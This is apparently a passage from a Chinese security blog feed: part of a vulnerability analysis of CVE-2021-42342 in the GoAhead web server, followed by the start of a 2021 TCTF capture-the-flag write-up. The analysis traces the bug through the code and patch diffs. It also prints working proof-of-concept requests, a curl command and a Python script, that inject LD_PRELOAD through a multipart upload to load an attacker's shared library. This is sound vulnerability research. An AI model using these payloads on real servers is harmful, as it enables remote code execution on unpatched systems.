\</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get install wget make gcc -y \</span></span><br><span class="line"><span class="bash">    &amp;&amp; wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz | tar zx --strip-components 1 -C /usr/src/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /usr/src \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make SHOW=1 ME_GOAHEAD_UPLOAD_DIR=<span class="string">&quot;&#x27;\&quot;/tmp\&quot;&#x27;&quot;</span> \</span></span><br><span class="line"><span class="bash">    &amp;&amp; make install \</span></span><br><span class="line"><span class="bash">    &amp;&amp; cp src/self.key src/self.crt /etc/goahead/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; mkdir -p /var/www/goahead/cgi-bin/ \</span></span><br><span class="line"><span class="bash">    &amp;&amp; apt-get purge -y --auto-remove wget make gcc \</span></span><br><span class="line"><span class="bash">    &amp;&amp; <span class="built_in">cd</span> /var/www/goahead \</span></span><br><span class="line"><span class="bash">    &amp;&amp; sed -e <span class="string">&#x27;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#x27;</span> -i /etc/goahead/route.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;goahead&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;--home&quot;</span>, <span class="string">&quot;/etc/goahead&quot;</span>, <span class="string">&quot;/var/www/goahead&quot;</span>]</span></span><br></pre></td></tr></table></figure><blockquote><p>这也是这个漏洞的第一个坑：<strong>新版本的GoAhead默认没有开启CGI配置，而老版本如果没有cgi-bin目录，或者里面没有cgi文件，也不受这个漏洞影响。</strong>所以并不像某些文章里说的那样影响广泛。</p></blockquote><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h4 id="HTTP-请求流程"><a href="#HTTP-请求流程" class="headerlink" title="HTTP 请求流程"></a>HTTP 请求流程</h4><p>调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#1  0x00007f44624fc11d in cgiHandler (wp&#x3D;0x55e66c994790) at src&#x2F;cgi.c:216</span><br><span class="line">#2  0x00007f446250e44b in websRunRequest (wp&#x3D;0x55e66c994790) at src&#x2F;route.c:182</span><br><span class="line">#3  0x00007f446250152c in websPump (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:870</span><br><span class="line">#4  0x00007f44625013b9 in readEvent (wp&#x3D;0x55e66c994790) at src&#x2F;http.c:834</span><br><span class="line">#5  0x00007f4462501142 in socketEvent (sid&#x3D;2, mask&#x3D;2, wptr&#x3D;0x55e66c994790) at src&#x2F;http.c:772</span><br><span class="line">#6  0x00007f4462516dbf in socketDoEvent (sp&#x3D;0x55e66c994650) at src&#x2F;socket.c:654</span><br><span class="line">#7  0x00007f4462516ce5 in socketProcess () at src&#x2F;socket.c:628</span><br><span class="line">#8  0x00007f4462502f34 in websServiceEvents (finished&#x3D;0x55e66aa02014 &lt;finished&gt;) at src&#x2F;http.c:1385</span><br><span class="line">#9  0x000055e66a8005cf in main (argc&#x3D;5, argv&#x3D;0x7fff507b50c8, envp&#x3D;0x7fff507b50f8) at src&#x2F;goahead.c:170</span><br></pre></td></tr></table></figure><p>整个<code>goahead</code>处理<code>cgi</code>所对应<code>post</code>请求处理流程小结如下：</p><ol><li><p>调用<code>websRead</code>函数，所有数据保存到了wp-&gt;rxbuf中。</p></li><li><p>调用</p><p><code>websPump</code></p><p>，该函数包含三部分：</p><ol><li>调用<code>parseIncoming</code>函数解析请求头以及调用<code>websRouteRequest</code>确定相应的处理函数。</li><li>调用<code>processContent</code>将处理post数据，将其保存到tmp文件中。</li><li>调用<code>websRunRequest</code>函数，调用相应的处理函数，cgi对应为<code>cgiHandler</code>。</li></ol></li><li><p>调用<code>cgiHandler</code>，将请求头以及get参数设置到环境变量中，调用<code>launchCgi</code>函数。</p></li><li><p>调用<code>launchCgi</code>函数，将标准输出输入重定向到文件句柄，调用<code>execve</code>启动cgi进程。</p></li></ol><h4 id="根本原因（Root-cause）"><a href="#根本原因（Root-cause）" class="headerlink" title="根本原因（Root cause）"></a>根本原因（Root cause）</h4><ol><li><code>strim</code> 函数的错误使用</li></ol><p>strim 函数定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PUBLIC <span class="keyword">char</span> *<span class="title">strim</span><span class="params">(<span class="keyword">char</span> *str, cchar *<span class="built_in">set</span>, <span class="keyword">int</span> where)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>    *s;</span><br><span class="line">    ssize   len, i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (str == <span class="number">0</span> || <span class="built_in">set</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">    s = (<span class="keyword">char</span>*) &amp;str[i];</span><br><span class="line">    <span class="keyword">if</span> (where &amp; WEBS_TRIM_END) &#123;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当第二个参数为 0 的时候， 直接返回 0 。然而 goahead 的 cgi.c:176 行代码是这样使用的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" title="image-20220110152602890" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201101526090.png" alt="image-20220110152602890"></a></p><p>那么此处 vp 的 值为 0 ， 因此后续的 smatch 判断都毫无意义。 另外我们注意到 182 和 186 行都是设置环境变量， 然而 183 行处会拼接 <code>CGI_</code> 到字符， 因此不是我们漏洞利用的目标。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ME_GOAHEAD_CGI_VAR_PREFIX <span class="meta-string">&quot;CGI_&quot;</span></span></span><br></pre></td></tr></table></figure><p>因此我们需要走到 186 行代码，需要 <code>s-&gt;arg</code> 为 0 即可（初始化状态为<code>0</code>）</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>需要在Body中发送multipart表单，然后在劫持环境变量。 PoC 如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -vv -F data=@poc.so -F <span class="string">&quot;LD_PRELOAD=/proc/self/fd/7&quot;</span> http://127.0.0.1:8080/cgi-bin/test.cgi\n</span><br></pre></td></tr></table></figure><h3 id="找不到文件描述符"><a href="#找不到文件描述符" class="headerlink" title="找不到文件描述符"></a>找不到文件描述符</h3><p>在使用如上 Dockerfile 作为环境的漏洞利用过程中，会发现劫持 so 的过程会有如下报错</p><ul><li><code>ERROR: ld.so: object &#39;/proc/self/fd/7&#39; from LD_PRELOAD cannot be preloaded (file too short): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/5&#39; from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.</code></li><li><code>ERROR: ld.so: object &#39;/proc/self/fd/2&#39; from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.</code></li></ul><p>经过调试和代码阅读分析了，大致原因如下：</p><p>当最后一个包被处理的时候，即进到 <code>upload.c#processContentData</code> 函数中</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" title="image-20220109172745897" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091727107.png" alt="image-20220109172745897"></a></p><p>即 334 行代码处，进入到 <code>get</code> 函数中，此函数逻辑为判断是否读到 upload 数据的结束符号，即 <code>boundary </code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────</span><br><span class="line">In file: &#x2F;usr&#x2F;src&#x2F;src&#x2F;upload.c</span><br><span class="line">   419     while (cp &lt; endp) &#123;</span><br><span class="line">   420         cp &#x3D; (char *) memchr(cp, first, endp - cp);</span><br><span class="line">   421         if (!cp) &#123;</span><br><span class="line">   422             return 0;</span><br><span class="line">   423         &#125;</span><br><span class="line"> ► 424         if (memcmp(cp, wp-&gt;boundary, wp-&gt;boundaryLen) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">   425             return cp;</span><br><span class="line">   426         &#125;</span><br><span class="line">   427         cp++;</span><br><span class="line">   428     &#125;</span><br><span class="line">   429     return 0;</span><br><span class="line">───────────────────────────────────────[ STACK ]────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7ffcd8eca3e0 —▸ 0x7ffcd8eca410 —▸ 0x5590f9adce48 ◂— &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">01:0008│     0x7ffcd8eca3e8 ◂— 0x2f &#x2F;* &#39;&#x2F;&#39; *&#x2F;</span><br><span class="line">02:0010│     0x7ffcd8eca3f0 —▸ 0x5590f9adce3f ◂— &#39;aaaaaa\n\r\n--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">03:0018│     0x7ffcd8eca3f8 —▸ 0x5590f9adb790 —▸ 0x5590f9add5d0 ◂— 0x67632f0054534f00</span><br><span class="line">04:0020│     0x7ffcd8eca400 —▸ 0x7ffcd8eca410 —▸ 0x5590f9adce48 ◂— &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">05:0028│     0x7ffcd8eca408 ◂— 0x2d005590f9adfd70</span><br><span class="line">06:0030│     0x7ffcd8eca410 —▸ 0x5590f9adce48 ◂— &#39;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">07:0038│     0x7ffcd8eca418 —▸ 0x5590f9adce4d ◂— &#39;4f720d6ce5bdc5b81100af0acc3b5--\r\n&#39;</span><br><span class="line">─────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────</span><br><span class="line"> ► f 0   0x7fb0335a7429 getBoundary+206</span><br><span class="line">   f 1   0x7fb0335a7003 processContentData+109</span><br><span class="line">   f 2   0x7fb0335a66f7 websProcessUploadData+372</span><br><span class="line">   f 3   0x7fb03358f7d4 processContent+110</span><br><span class="line">   f 4   0x7fb03358e51b websPump+104</span><br><span class="line">   f 5   0x7fb03358e3b9 readEvent+352</span><br><span class="line">   f 6   0x7fb03358e142 socketEvent+159</span><br><span class="line">   f 7   0x7fb0335a3dbf socketDoEvent+197</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p cp</span><br><span class="line">$15 &#x3D; 0x5590f9adce48 &quot;--1544f720d6ce5bdc5b81100af0acc3b5--\r\n&quot;</span><br><span class="line">pwndbg&gt; p wp-&gt;boundary</span><br><span class="line">$16 &#x3D; 0x5590f9ad5a70 &quot;--1544f720d6ce5bdc5b81100af0acc3b5&quot;</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>如果是则返回 <code>cp</code>, 因此，当正常的数据包的时候，此时 334 行的判断不成立，代码会往下走，最后走到 391 代码，close 调临时文件的 fd， 因此包含的时候会报错。</p><p>那么怎么解决这个问题呢？ phith0n 师傅文章中的解决方案如下：</p><blockquote><p>首先构造好之前那个无法利用的数据包，其中第一个表单字段是<code>LD_PRELOAD</code>，值是文件描述符，一般是<code>/proc/self/fd/7</code>。然后我们需要改造这个数据包：</p><ul><li>给payload.so文件末尾增加几千个字节的脏字符，比如说<code>a</code></li><li>关掉burpsuite自动的“Update Content-Length”</li><li>将数据包的Content-Length设置为不超过16384的值，但需要比payload.so文件的大小要大个500字节左右，我这里设置为15000</li></ul></blockquote><p>构造如下payload： </p><ol><li>Content-Length 小于总的 upload data 的大小</li><li>Content-Length 至少要大于 payload.so  的大小</li></ol><p>那么这个方法是如何生效的呢？ 当出发upload 后，到执行 cgi， 程序代码会调用<code>processContent</code>将处理post数据，将其保存到tmp文件中， 其代码如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" title="image-20220109192138087" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091921124.png" alt="image-20220109192138087"></a></p><p>当 <code>wp-&gt;oef </code> 为假时， 程序会判断 post 的数据未读完，因此会进到 <code>filterChunkData</code> 函数中， 当程序判断数据已经读完，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" title="image-20220109193908584" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091939636.png" alt="image-20220109193908584"></a></p><p>即 <code>wp-&gt;rxRemainning &lt;=0</code> 后，会设置 <code>wp-&gt;eof</code>  的值为 1 。 这表明根据 数据已经接受完毕，然后走到 <code>upload.c:1216</code> 行, 调用 <code>websProcessUploadData </code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" title="image-20220109191114896" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091911961.png" alt="image-20220109191114896"></a></p><p>执行到如上图中到 145 行代码处，调用processContentData`函数，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" title="image-20220109194405252" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091944301.png" alt="image-20220109194405252"></a></p><p>由于我们设置的 Content-Length 小于总的数据包大小，因此我们是读不到 <code>Boundaray</code> ，因此这里 348 代码返回 0  。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" title="image-20220109194525781" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091945836.png" alt="image-20220109194525781"></a></p><p><code>canProceed</code> 为零，从148 代码处返回到 http.c:1216 行。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" title="image-20220109194835191" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091948266.png" alt="image-20220109194835191"></a></p><p>然后从 1218 行处代码返回到 http.c:867 行</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" title="image-20220109194953182" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091949226.png" alt="image-20220109194953182"></a></p><p>接着 for 循环因为 canProceed 为 0 ，因此 break 退出循环。至此到这还没有调到 cgi ，但程序的数据已处理完一部分。 然后程序直接退回到 <code>readEvent</code>, 之后由于我们数据包并没有发送完， 还有一部分到脏数据未处理。代码又会走一遍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socketEvent—&gt;readEvent-&gt;websPump-&gt;processContent</span><br></pre></td></tr></table></figure><p>当到 processContent 函数的时候，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" title="image-20220109195548187" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091955229.png" alt="image-20220109195548187"></a></p><p>1209 行代码不满足， 1239 行代码满足， 因此 <code>wp-&gt;state</code> 被设置为 WEBS_READY 。然后再 websPump 代码处执行 <code>websRunrequest</code>， 最后执行 CGI 。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" title="image-20220109195658790" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201091956842.png" alt="image-20220109195658790"></a></p><p><strong>总结</strong></p><ol><li>让程序没有读取到 boundary , 程序会觉得数据没有处理完， 因此不会 close 文件描述符</li><li>让程序认为剩下未读到数据， 不可能读到 boundary 了， 因此会再 http.c:1293 行处设置 wp-&gt;eof flag </li><li>保持链接的不中断， 程序会接着尝试读数据</li></ol><p>根据以上的分析以及之后的实践， 我们发现除了 phith0n  师傅的这种方法，其实还有其他方法，且不需要竞争</p><ol><li>两次发送数据，第一次发送需要 payload.so 发送且写入临时文件，且通过删除 boundary 让程序handle住，第二次发送劫持环境变量</li><li>一次发送， 只需删除 boundary 标志， 然后 sleep 后， 发送一次数据即可</li></ol><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><a href="https://github.com/embedthis/goahead/commit/6906212c8db07265850e3870dbc97b541712e2c7">FIX: flag upload form vars as untrusted so they will be prefixed. · embedthis/goahead@6906212 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@@ -320,6 +320,7 @@ static bool processContentData(Webs *wp)</span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    WebsBuf     *content;</span><br><span class="line"><span class="addition">+    WebsKey     *sp;</span></span><br><span class="line">    ssize       size, nbytes, len;</span><br><span class="line">    char        *data, *bp;</span><br><span class="line"></span><br><span class="line">@@ -380,7 +381,9 @@ static bool processContentData(Webs *wp)</span><br><span class="line">            trace(5, &quot;uploadFilter: form[%s] = %s&quot;, wp-&gt;uploadVar, data);</span><br><span class="line">            websDecodeUrl(wp-&gt;uploadVar, wp-&gt;uploadVar, -1);</span><br><span class="line">            websDecodeUrl(data, data, -1);</span><br><span class="line"><span class="deletion">-           websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            sp = websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            //  Flag as untrusted so CGI will prefix</span></span><br><span class="line"><span class="addition">+            sp-&gt;arg = 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        websConsumeInput(wp, nbytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/embedthis/goahead/commit/5bc764136fc7adbeea419d8cd360ed407c555f07">FIX: trim CGI env vars for black list · embedthis/goahead@5bc7641 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@ -173,10 +173,10 @@ PUBLIC bool cgiHandler(Webs *wp)</span><br><span class="line">    if (wp-&gt;vars) &#123;</span><br><span class="line">        for (n = 0, s = hashFirst(wp-&gt;vars); s != NULL; s = hashNext(wp-&gt;vars, s)) &#123;</span><br><span class="line">            if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string) &#123;</span><br><span class="line"><span class="deletion">-                vp = strim(s-&gt;name.value.string, 0, WEBS_TRIM_START);</span></span><br><span class="line"><span class="addition">+                vp = strim(s-&gt;name.value.string, &quot; \t\r\n&quot;, WEBS_TRIM_BOTH);</span></span><br><span class="line">                if (smatch(vp, &quot;REMOTE_HOST&quot;) || smatch(vp, &quot;HTTP_AUTHORIZATION&quot;) ||</span><br><span class="line">                    smatch(vp, &quot;IFS&quot;) || smatch(vp, &quot;CDPATH&quot;) ||</span><br><span class="line"><span class="deletion">-                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line"><span class="addition">+                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;PYTHONPATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                if (s-&gt;arg != 0 &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#x27;\0&#x27;) &#123;</span><br></pre></td></tr></table></figure><p>修正了  strim 函数的正确使用，以及对文件上传处理同样加入了<code>sp-&gt;arg = 1</code>的处理</p><h2 id="找不到文件描述符-的问题补充"><a href="#找不到文件描述符-的问题补充" class="headerlink" title="找不到文件描述符 的问题补充"></a>找不到文件描述符 的问题补充</h2><p>update ： 2022/01/17 </p><p>@nepire 今天和我提了一个解决这个问题的另外一个方法 ， 我们简单回顾下代码</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" title="image-20220117171150196" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" alt="image-20220117171150196"></a></p><p>我们可以看到我们的临时文件是在 src/upload.c:342 行写入的，但是除了此处以为我们没有其他地方写临时文件了吗？搜索一下 <code>write\(.*fd</code> 写入文件的代码</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" title="image-20220117172041121" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" alt="image-20220117172041121"></a></p><p>我们找到另外一处文件描述符， <code>wp-&gt;cgifd</code> , 其写入的内容为 <code>wp-&gt;input.servp</code>,   那么我们如何保证 <code>wp-&gt;input.servp</code> 数据即为 ELF 的数据呢？</p><p>根据简单阅读代码, 即在 upload.c  代码中</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" title="image-20220117180115037" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" alt="image-20220117180115037"></a></p><p>在 upload 处理数据的过程中， 数据指针由 <code>bufCompact</code> 函数处理：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" title="image-20220117180328157" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" alt="image-20220117180328157"></a></p><p>该函数将此次读取的 数据由 <code>bp-&gt;servp</code> 拷贝到 <code>bp-&gt;buf</code>中， 然后在移动修改 <code>bp-&gt;servp</code> ， 当读取到 <code>Boundary</code>结束的时候，<code>bp-&gt;servp</code> 刚好指向了 <code>--------------------------6671c05704e869e7--</code> 的结尾处，因此我们只需在此处后面补充 ELF 数据即可</p><p>因此大致 PoC 如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">headers = <span class="string">&quot;&quot;&quot;POST /cgi-bin/test.cgi HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost:8080\r</span></span><br><span class="line"><span class="string">Accept: */*\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=------------------------f74e4c2f448c9827\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">body = <span class="string">b&quot;&quot;&quot;--------------------------f74e4c2f448c9827</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">/dev/stdin\r</span></span><br><span class="line"><span class="string">--------------------------f74e4c2f448c9827--\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#/dev/stdin</span></span><br><span class="line"><span class="comment">#/proc/self/fd/0</span></span><br><span class="line"></span><br><span class="line">n = remote(ip,port)</span><br><span class="line">post = body + parse_so(<span class="string">&#x27;./poc.so&#x27;</span>)</span><br><span class="line">n.send(headers.format(len(post)).encode(<span class="string">&#x27;latin&#x27;</span>) + post)</span><br></pre></td></tr></table></figure><p>另外此时劫持的 fd 可以指向 0 或者 6， 因为在 launchCgi 函数中会重新 dup2 相关文件描述符。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" title="image-20220117184055856" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" alt="image-20220117184055856"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6407">CVE-2017-17562 GoAhead远程代码执行漏洞分析 - 先知社区 (aliyun.com)</a></p><p><a href="https://tttang.com/archive/1399/">GoAhead环境变量注入复现踩坑记 - 跳跳糖 (tttang.com)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-42342" scheme="https://bestwing.me/tags/CVE-2021-42342/"/>
    
  </entry>
  
  <entry>
    <title>2021 TCTF iOA and RV Writeup</title>
    <link href="https://bestwing.me/2021-TCTF-RV-Writeup.html"/>
    <id>https://bestwing.me/2021-TCTF-RV-Writeup.html</id>
    <published>2021-07-05T16:00:00.000Z</published>
    <updated>2021-08-20T18:50:44.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>周末和r3kapig的小伙伴一起打了， 0CTF/TCTF 2021 Quals， 然后两天的时间都耗在了 iOA 和 RV 这两个题身上了。<br><a class="gallery-item"><img src=""></a>(<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png">https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png</a>)</p><h2 id="iOA"><a href="#iOA" class="headerlink" title="iOA"></a>iOA</h2><p>这个题目，在 pizza 和 圣博 因为在拖着我的情况下做了好久才做出来， 最终拿了个二血。</p><p>题目实现了一个 sslvpn 协议栈，有几个漏洞点</p><p>（1）urlencode 可以绕过  ../ 的检查，导致跨目录文件读取， 可以读取 user.txt 的账号密码</p><p>   (2)  vip 的 bitmap 操作有负数越界操作， 可以访问bss上的内容, 读master_key，改dhcp_pool，用req_vip的整数截断leak canary，在req_vip里栈溢出。</p><p>相关文件可以这里获取；</p><ol><li><p>sslvpn idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64">http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/leak.py">leak.py</a></p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/exploit.py">exploit.py</a></p><p><a 